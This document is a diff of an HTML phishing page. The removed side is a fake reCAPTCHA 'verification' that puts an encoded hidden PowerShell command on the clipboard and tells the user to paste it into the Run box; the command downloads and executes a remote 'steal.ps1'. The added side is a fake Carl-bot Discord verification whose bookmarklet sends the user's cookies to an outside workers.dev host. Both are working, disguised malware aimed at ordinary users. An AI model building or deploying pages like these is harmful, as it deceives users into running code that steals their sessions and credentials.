@@ -1,427 +1,331 @@
 <!DOCTYPE html>
-
 <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <title>reCAPTCHA Verification</title>
-
-        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
-        <style>
-        .container {
-            font-family: Roboto, helvetica, arial, sans-serif;
-        }
-
-        .m-p {
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carl-bot · Verification</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    <style>
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
         }
 
-        .block {
-            display: block;
+        body {
+            background-color: #0b1a0f;
+            background-image: radial-gradient(circle at 20% 30%, #1a3a22 0%, #0b1a0f 80%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
 
-        code {
-            font-size: 9px;
-            margin-left: 2px;
-            color: gray;
+        .card {
+            max-width: 720px;
+            width: 100%;
+            background: #0f1d14;
+            border-radius: 32px;
+            border: 1px solid #2b5a38;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px #1e3d28 inset;
+            padding: 36px 32px 28px;
+            transition: box-shadow 0.2s;
         }
 
-        .line-normal {
-            line-height: normal;
+        /* header */
+        .badge {
+            display: inline-block;
+            background: #1f402a;
+            color: #8fc99e;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            padding: 4px 14px;
+            border-radius: 30px;
+            border: 1px solid #2f5a3d;
+            margin-bottom: 18px;
+            text-transform: uppercase;
         }
 
-        .checkbox-window {
-            height: 74px;
-            width: 300px;
-            background-color: #f9f9f9;
-            border-radius: 3px;
-            border: 1px solid #d3d3d3;
+        h1 {
+            color: #dff0e3;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin-bottom: 6px;
         }
 
-        .checkbox-window a {
-            color: #555;
+        .subhead {
+            color: #8ebc9b;
+            font-size: 15px;
+            margin-bottom: 24px;
+            border-left: 3px solid #3a7a4e;
+            padding-left: 16px;
+            background: rgba(30, 70, 40, 0.25);
+            border-radius: 0 12px 12px 0;
+            line-height: 1.5;
+        }
+
+        .subhead strong {
+            color: #b7e0c4;
+        }
+
+        .subhead kbd {
+            background: #1b2f20;
+            color: #b7e0c4;
+            padding: 2px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            border: 1px solid #2f5a3d;
+            font-weight: 600;
+        }
+
+        /* drag section */
+        .drag-section {
+            background: #0e1d14;
+            border-radius: 20px;
+            padding: 22px 20px 26px;
+            border: 1px solid #244d2f;
+            margin-bottom: 18px;
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .drag-label {
+            color: #b0d4bd;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .drag-label kbd {
+            background: #1b2f20;
+            color: #b7e0c4;
+            padding: 2px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            border: 1px solid #2f5a3d;
+            font-weight: 600;
+        }
+
+        /* THE DRAG BUTTON — with animation */
+        .drag-btn {
+            display: inline-block;
+            background: linear-gradient(145deg, #1d4a2a, #12331e);
+            color: #dff0e3;
+            font-weight: 600;
+            font-size: 18px;
+            padding: 14px 28px;
+            border-radius: 60px;
+            border: 1px solid #3c7a52;
+            box-shadow: 0 6px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.6);
+            cursor: grab;
+            user-select: none;
+            transition: all 0.15s ease;
+            letter-spacing: 0.5px;
+            text-shadow: 0 2px 3px rgba(0,0,0,0.5);
+            position: relative;
+            width: fit-content;
+            min-width: 180px;
+            text-align: center;
             text-decoration: none;
         }
 
-        .checkbox-window a:hover {
-            color: #555;
+        .drag-btn::after {
+            content: " ⤵";
+            font-size: 22px;
+            display: inline-block;
+            transition: transform 0.3s ease;
+        }
+
+        .drag-btn:active {
+            cursor: grabbing;
+            transform: scale(0.96);
+            box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.7);
+        }
+
+        .drag-btn.dragging {
+            animation: pulseDrag 0.5s infinite alternate ease-in-out;
+            cursor: grabbing;
+        }
+
+        @keyframes pulseDrag {
+            0% {
+                transform: scale(0.98);
+                box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 50, 20, 0.5);
+                background: linear-gradient(145deg, #1d4a2a, #12331e);
+            }
+            100% {
+                transform: scale(1.02);
+                box-shadow: 0 2px 0 #0a1f12, 0 12px 30px rgba(30, 120, 60, 0.4);
+                background: linear-gradient(145deg, #245f34, #143d22);
+            }
+        }
+
+        .step-hint {
+            color: #7da58a;
+            font-size: 13px;
+            margin-top: 14px;
+            background: #0f1f16;
+            padding: 10px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            border: 1px solid #1f402a;
+        }
+
+        .step-hint i {
+            font-style: normal;
+            background: #1a3723;
+            padding: 0 10px;
+            border-radius: 20px;
+            color: #b7e0c4;
+        }
+
+        /* bottom bar — exactly like carlbot */
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #1f402a;
+            padding-top: 20px;
+            margin-top: 12px;
+            gap: 12px;
+        }
+
+        .footer-left {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .footer-left a {
+            color: #79a887;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .footer-left a:hover {
+            color: #b7e0c4;
             text-decoration: underline;
         }
 
-        .checkbox-container {
-            width: 28px;
-            height: 28px;
+        .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
         }
 
-        .checkbox {
-            position: relative;
-            background-color: #fff;
-            border-radius: 2px;
-            height: 100%;
-            width: 100%;
-            border: 2px solid #c1c1c1;
-            margin: 21px 0 0 12px;
-            outline: none;
-            font-family: Roboto, helvetica, arial, sans-serif;
-            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
-        }
-
-        .checkbox:hover {
-            border: 2px solid #b2b2b2;
-        }
-
-        .im-not-a-robot {
-            position: relative;
-            left: 52px;
-            bottom: 3px;
-            font-size: 15px;
-            color: #282727;
-        }
-
-        .captcha-logo {
-            position: relative;
-
-            left: 244px;
-            bottom: 36px;
-            width: 40px;
-            height: 45px;
-            vertical-align: baseline;
-            padding-bottom: 4px;
-        }
-
-
-        .checkbox-desc {
-            color: #555555;
-            position: relative;
-            font-size: 8px;
-            text-align: center;
-            bottom: 40px;
-            left: 112px;
-        }
-
-        .spinner {
-            visibility: hidden;
-            position: relative;
-            top: -85px;
-            left: 12px;
-            height: 20px;
-            width: 20px;
-            border: 2px solid rgba(0, 0, 0, 0.1);
-            border-top: 2px solid #333;
-            border-radius: 50%;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.5s linear;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .verify-window {
-            font-family: Roboto, helvetica, arial, sans-serif;
-            opacity: 0;
-            position: absolute;
-            visibility: hidden;
-            margin: auto;
-            width: 310px;
-            background-color: #fff;
-            border: 1px solid #cecece;
-            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
-            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
-            transition: opacity 400ms;
-        }
-
-        ol {
-            counter-reset: item;
-            list-style-type: none;
-            list-style-position: outside;    
-            padding-left: 0;
-
-        }
-
-        ol li {
-            counter-increment: item;
-            margin-bottom: 10px;
-
-        }
-
-        ol li::before {
-            content: counter(item) ". ";
-            color: #1A73E8;
-            font-weight: bold;
-            margin-right: 10px;
-            margin-left: 10px;
-        }
-
-        .verify-container {
-            padding: 8px;
-        }
-
-        .verify-header {
-            background-color: #1A73E8;
-            padding: 16px 16px 24px 16px;
-            color: #fff;
-        }
-
-        .verify-header-text-small {
-            font-size: 14px;
-            line-height: normal;
-        }
-
-        .verify-header-text-medium {
-            font-size: 16px;
-        }
-
-        .verify-header-text-big {
-            font-size: 24px;
-            font-weight: 700;
-        }
-
-        .verify-main {
-            padding: 5px;
-            color: #111;
-            font-size: 13px;
-
-        }
-
-        .verify-footer {
-            border-top: 1px solid #cecece;
-            padding: 10px 7px 10px 7px;
-            color: #737373;
-            display: grid;
-            grid-template-columns: auto 102px;
-            font-size: 13px;
-        }
-
-        .verify-footer-left {
-            padding: 5px;
-        }
-
-        .verify-verify-button {
-            text-transform: uppercase;
-            background-color: #5a89e2;
-            color: #fff;
-            text-align: center;
-            width: 100%;
-            padding: 12px 0 12px 0;
-            text-decoration: none;
+        .login-btn {
+            background: #1f402a;
+            color: #dff0e3;
+            border: 1px solid #2f5a3d;
+            padding: 6px 22px;
+            border-radius: 60px;
             font-weight: 600;
-            height: min-content;
-            border-radius: 3px;
             font-size: 14px;
-            border: none;
-            outline: none;
-            cursor: not-allowed;
+            cursor: default;
+            transition: background 0.2s;
         }
-        </style>
-    </head>
-    <body>
 
-    <div class="container m-p">    
-        <div id="checkbox-window" class="checkbox-window m-p block">
-            <div class="checkbox-container m-p">
-                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
-            </div>
-            <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
-            <br>
-            <p class="checkbox-desc m-p line-normal">
-            <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
-            </p>
-            <img class="spinner" alt="" id="spinner">
-        </div>
-        
-        <div id="verify-window" class="verify-window">
-            <div class="verify-container">
-                <header class="verify-header">
-                    <span class="verify-header-text-medium m-p block">Complete these</span>
-                    <span class="verify-header-text-big m-p block">Verification Steps</span>
-                    <span class="verify-header-text-medium m-p block"></span>
-                </header>
-                <main class="verify-main">
-                    <p>
-                        To better prove you are not a robot, please:
-                    </p>
-                    <ol>
-                        <li>
-                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
-                        </li>
-                        
-                        <li>
-                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
-                        </li>
+        .login-btn:hover {
+            background: #2a5537;
+        }
 
-                        <li>
-                            Press <b>Enter</b> on your keyboard to finish.
-                        </li>
-                    </ol>
-                    <p>
-                        You will observe and agree:
-                        <br>
-                    <code>
-                        ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
-                    </code>
-                    </p>
+        .brand {
+            color: #8fc99e;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: -0.3px;
+        }
 
-                   
-                </main>
-            </div>
-            <footer class="verify-container verify-footer">
-                <div class="verify-footer-left">
-                    Perform the steps above to finish verification.
-                </div>
-                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
-            </footer>
-        </div>        
+        .brand small {
+            font-weight: 400;
+            color: #5a8a6a;
+        }
+
+        @media (max-width: 550px) {
+            .card { padding: 20px 14px; }
+            h1 { font-size: 20px; }
+            .drag-btn { font-size: 16px; padding: 12px 20px; min-width: 140px; }
+            .footer { flex-direction: column; align-items: flex-start; }
+            .footer-right { width: 100%; justify-content: flex-start; }
+            .footer-left { gap: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+
+    <!-- Carl-bot style header -->
+    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+        <div class="badge">🔒 VERIFICATION REQUIRED</div>
+        <div class="brand">CARL.GG <small>· bot</small></div>
     </div>
 
-    <script>
-        let checkboxWindow = document.getElementById("checkbox-window");
-        let checkboxBtn = document.getElementById("checkbox");
-        let checkboxBtnSpinner = document.getElementById("spinner");
-        let verifywindow = document.getElementById("verify-window");
+    <h1>How to verify?</h1>
+    <div class="subhead">
+        <strong>Drag the bookmarklet</strong> to your bookmarks bar and click it while on <strong>Discord</strong>.<br>
+        To enable your bookmarks bar, press <kbd>CTRL+SHIFT+B</kbd>
+    </div>
 
-        function addCaptchaListeners() {
-            if (checkboxBtn) {
-                document.addEventListener("click", function (event) {
-                    let path = event.composedPath();
-                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
-                        closeverifywindow();
-                    }
-                });
-                checkboxBtn.addEventListener("click", function (event) {
-                    event.preventDefault();
-                    checkboxBtn.disabled = true;
-                    runClickedCheckboxEffects();
-                });
-            }
-        }
+    <!-- Drag section -->
+    <div class="drag-section">
+        <div class="drag-label">
+            📌 Drag me to your bookmarks bar
+            <kbd>CTRL+SHIFT+B</kbd>
+        </div>
 
-        function runClickedCheckboxEffects() {
-            hideCaptchaCheckbox();
-            setTimeout(function(){
-                showCaptchaLoading();
-            },500);
-            setTimeout(function(){
-                showVerifyWindow();
-            },900)
-        }
+        <!-- THE DRAG BUTTON – bookmarklet code inside href -->
+        <a href="javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');})();" 
+           class="drag-btn" 
+           id="dragBtn"
+           draggable="false"
+           onmousedown="this.classList.add('dragging')" 
+           onmouseup="this.classList.remove('dragging')" 
+           onmouseleave="this.classList.remove('dragging')">
+            🔐 Drag me!
+        </a>
 
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
-        }
+        <div class="step-hint">
+            <i>⏳</i> hold & drag to bookmarks bar · then click on Discord
+        </div>
+    </div>
 
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.opacity = "0";
-            checkboxBtnSpinner.style.animation = "none";
-            setTimeout(function() {
-                checkboxBtnSpinner.style.visibility = "hidden";
-            }, 500);
-        }
+    <!-- footer — carlbot style -->
+    <div class="footer">
+        <div class="footer-left">
+            <a href="#">Docs</a>
+            <a href="#">+ Invite</a>
+            <a href="#">Discord</a>
+            <a href="#">Status</a>
+            <a href="#">Games</a>
+            <a href="#">Discover</a>
+            <a href="#">Premium</a>
+        </div>
+        <div class="footer-right">
+            <span class="login-btn">Login</span>
+        </div>
+    </div>
 
-        function hideCaptchaCheckbox() {
-            checkboxBtn.style.visibility = "hidden";
-            checkboxBtn.style.opacity = "0";
-        }
+</div>
 
+<script>
+    // add pulsing animation when user holds the button
+    const btn = document.getElementById('dragBtn');
+    btn.addEventListener('mousedown', () => btn.classList.add('dragging'));
+    btn.addEventListener('mouseup', () => btn.classList.remove('dragging'));
+    btn.addEventListener('mouseleave', () => btn.classList.remove('dragging'));
+</script>
 
-        function showCaptchaCheckbox() {
-            checkboxBtn.style.width = "100%";
-            checkboxBtn.style.height = "100%";
-            checkboxBtn.style.borderRadius = "2px";
-            checkboxBtn.style.margin = "21px 0 0 12px";
-            checkboxBtn.style.opacity = "1";
-        }
-
-        function hideCaptchaCheckbox() {
-            checkboxBtn.style.width = "4px";
-            checkboxBtn.style.height = "4px";
-            checkboxBtn.style.borderRadius = "50%";
-            checkboxBtn.style.marginLeft = "25px";
-            checkboxBtn.style.marginTop = "33px";
-            checkboxBtn.style.opacity = "0";
-        }
-
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-        }
-
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "hidden";
-            checkboxBtnSpinner.style.opacity = "0";
-        }
-
-       function generateRandomNumber() {
-            const min = 1000; 
-            const max = 9999;
-            return Math.floor(Math.random() * (max - min + 1) + min).toString();
-        }
-
-        function closeverifywindow() {
-            verifywindow.style.display = "none";
-            verifywindow.style.visibility = "hidden";
-            verifywindow.style.opacity = "0";
-
-            showCaptchaCheckbox();
-            hideCaptchaLoading();
-            checkboxBtn.disabled = false;
-        }
-
-        function isverifywindowVisible() {
-            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
-        }
-
-        function setClipboardCopyData(textToCopy){
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.append(tempTextArea);
-            tempTextArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempTextArea);
-        }
-
-       function stageClipboard(commandToRun, verification_id){
-    // Copy ONLY the command - no suffix or verification text
-    const textToCopy = commandToRun;
-    setClipboardCopyData(textToCopy);
-}
-
-
-        function showVerifyWindow() {
-            verifywindow.style.display = "block";
-            verifywindow.style.visibility = "visible";
-            verifywindow.style.opacity = "1";
-            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
-
-            if (verifywindow.offsetTop < 5) {
-               verifywindow.style.top = "5px";
-            }
-
-            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
-               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
-            }
-
-            var verification_id = generateRandomNumber();
-            document.getElementById('verification-id').textContent = verification_id;
-            
-            const commandToRun = "powershell -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBlAG4AYwAgACQAeAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHUAPQAnAGgAdAB0AHAAcwA6AC8ALwB2AGUAcgBpAGYAeQAuAHQAeQBjAGUAbgBvADgAOQAuAHcAbwByAGsAZQByAHMALgBkAGUAdgAvAHMAdABlAGEAbAAuAHAAcwAxACcAOwAkAHMAPQAkAHgALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHUAKQA7AGkAZQB4ACAAJABzAA==";
-stageClipboard(commandToRun, verification_id)
-        }
-
-        addCaptchaListeners();
-
-        </script>
-    </body>
+</body>
 </html>
